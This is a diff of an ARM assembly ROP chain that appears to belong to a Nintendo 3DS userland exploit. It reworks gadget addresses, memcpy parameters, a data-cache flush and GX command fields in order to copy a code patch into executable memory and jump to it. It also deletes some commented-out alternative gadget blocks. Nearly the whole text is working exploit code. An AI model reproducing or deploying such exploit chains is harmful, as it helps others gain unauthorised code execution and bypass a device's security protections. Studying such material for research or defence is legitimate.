@@ -46,22 +46,17 @@ secondaryROP:
 			.word 0xDEADC0DE ; r4 (garbage)
 			.word 0x002d2b18 ; lr (pop	{r0, pc})
 		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
-			.word CN_TMPVAR_ADR ; r0 (tmp var)
-		.word 0x00272738 ; ldr r0, [r0] | pop {r4, pc}
-			.word codePatch ; add to r0 -> r1 (src)
-		.word 0x001e5ab0 ; add r0, r0, r4 | pop {r4, pc}
-			.word CN_CODELOCATIONGSP ; r4 -> r0 (dst)
-		.word 0x0016a248 ; mov r1, r0 | mov r0, r4 | pop {r4, r5, r6, lr}
-			.word 0xDEADC0DE ; r4 (garbage)
-			.word 0xDEADC0DE ; r5 (garbage)
-			.word 0xDEADC0DE ; r6 (garbage)
-		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
-			; .word codePatchEnd-codePatch ; r2 (size) ; beware cache flushing trouble...
-			.word 0x00010000 ; r2 (size)
+			.word CN_TMPVAR_ADR-4 ; r0 (tmp var)
+  		.word 0x00271df8 ; ldr r1, [r0, #4] | add r0, r0, r1 | pop {r3, r4, r5, pc}
 			.word 0xDEADC0DE ; r3 (garbage)
 			.word 0xDEADC0DE ; r4 (garbage)
+			.word 0xDEADC0DE ; r5 (garbage)
 		.word 0x002d2b18 ; pop	{r0, pc}
-			.word CN_CODELOCATIONGSP ; r0 (dst)
+			.word CN_CODELOCATIONGSP-codePatch ; r0 (dst)
+		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
+			.word codePatchEnd ; r2 (size)
+			.word 0xDEADC0DE ; r3 (garbage)
+			.word 0xDEADC0DE ; r4 (garbage)
 		.word 0x00229B38 ; memcpy (ends in BX LR)
 
 	;flush data cache
@@ -71,7 +66,8 @@ secondaryROP:
 			.word 0xFFFF8001 ; r1 (kprocess handle)
 		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
 			.word CN_CODELOCATIONGSP  ; r2 (address)
-			.word codePatchEnd-codePatch ; r3 (size)
+			; .word codePatchEnd-codePatch ; r3 (size) ; beware cache flushing trouble...
+			.word 0x00010000 ; r3 (size)
 			.word 0xDEADC0DE ; r4 (garbage)
 		.word CN_GSPGPU_FlushDataCache_ADR+4 ; GSPGPU_FlushDataCache (ends in LDMFD SP!, {R4-R6,PC})
 			.word 0xDEADC0DE ; r4 (garbage)
@@ -93,18 +89,16 @@ secondaryROP:
 
 			.word CN_GXCOMMAND_ADR+0x8 ; r4
 		.word 0x002d2b18 ; pop	{r0, pc}
-			.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET+0x07C00000 ; tmp
+			.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET+FIRM_APPMEMALLOC ; r0
 		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
 
 			.word CN_GXCOMMAND_ADR+0xC ; r4
 		.word 0x002d2b18 ; pop	{r0, pc}
 			.word 0x00010000
-			; .word 0x00046500
 		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
 
 			.word CN_GXCOMMAND_ADR+0x10 ; r4
 		.word 0x002d2b18 ; pop	{r0, pc}
-			; .word 0xFFFFFFFF
 			.word 0x00000000
 		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
 
@@ -122,29 +116,6 @@ secondaryROP:
 		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
 			.word 0xDEADC0DE ; r4 (garbage)
 
-
-
-
-		; .word 0x0027273C ; pop {r4, pc}
-		; 	.word CN_GXCOMMAND_ADR+0x8 ; r4
-		; .word 0x002d2b18 ; pop	{r0, pc}
-		; 	.word CN_TOPFBADR1
-		; .word 0x0020096c ; str r0, [r4] | pop {r4, pc}
-		; 	.word 0xDEADC0DE ; r4 (garbage)
-
-	; ;fix GX command address
-	; 	.word 0x002d2b18 ; pop	{r0, pc}
-	; 		.word 0x1FF80040 ; APPMEMALLOC
-	; 	.word 0x00272738 ; ldr r0, [r0] | pop {r4, pc}
-	; 		.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET ; r4 (offset to dst from end of APPKICATION mem region)
-	; 	.word 0x001e5ab0 ; add r0, r0, r4 | pop {r4, pc}
-	; 		.word CN_GXCOMMAND_ADR+0x8 ; r4 (location of dst field in GX command struct)
-	; 		; .word CN_GXCOMMAND_ADR+0x4 ; r4 (location of src field in GX command struct)
-	; 	.word 0x002d2b18 ; pop	{r0, pc}
-	; 		.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET+0x07C00000
-	; 	.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
-	; 		.word 0xDEADC0DE ; r4 (garbage)
-
 	;send GX command
 		.word 0x002d2b18 ; pop	{r0, pc}
 			.word CN_GSPSHAREDBUF_ADR ; r0
@@ -156,24 +127,6 @@ secondaryROP:
 			.word 0xDEADC0DE ; r6 (garbage)
 			.word 0xDEADC0DE ; r7 (garbage)
 			.word 0xDEADC0DE ; r8 (garbage)
-
-		; .word 0x0027273C ; pop {r4, pc}
-		; 	.word CN_GXCOMMAND_ADR+0x8 ; r4
-		; .word 0x002d2b18 ; pop	{r0, pc}
-		; 	.word CN_TOPFBADR2
-		; .word 0x0020096c ; str r0, [r4] | pop {r4, pc}
-		; 	.word 0xDEADC0DE ; r4 (garbage)
-
-		; .word 0x002d2b18 ; pop	{r0, pc}
-		; 	.word CN_GSPSHAREDBUF_ADR ; r0
-		; .word 0x0022b2bc ; pop	{r1, pc}
-		; 	.word CN_GXCOMMAND_ADR ; r1 (cmd addr)
-		; .word CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue+4 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R8,PC})
-		; 	.word 0xDEADC0DE ; r4 (garbage)
-		; 	.word 0xDEADC0DE ; r5 (garbage)
-		; 	.word 0xDEADC0DE ; r6 (garbage)
-		; 	.word 0xDEADC0DE ; r7 (garbage)
-		; 	.word 0xDEADC0DE ; r8 (garbage)
 
 	;sleep for a second and jump to code
 		.word 0x001742ec ; pop {r3, pc}
